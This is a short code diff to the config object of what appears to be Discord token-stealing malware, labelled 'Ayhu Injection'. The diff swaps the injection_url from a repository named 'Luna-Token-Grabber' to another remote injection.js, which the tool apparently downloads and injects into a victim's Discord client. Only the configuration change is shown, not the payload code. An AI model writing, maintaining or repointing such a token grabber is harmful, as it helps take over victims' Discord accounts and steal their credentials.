@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Ayhu Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/864559355768602654/1030131678536028201/yun-iijima-new-game.gif?size=4096'.replace(/ /g, '%20'), 
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/Smug246/Luna-Token-Grabber/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/noobinjector/discord-injector/main/injection.js', 
   /**
    * 
    **/
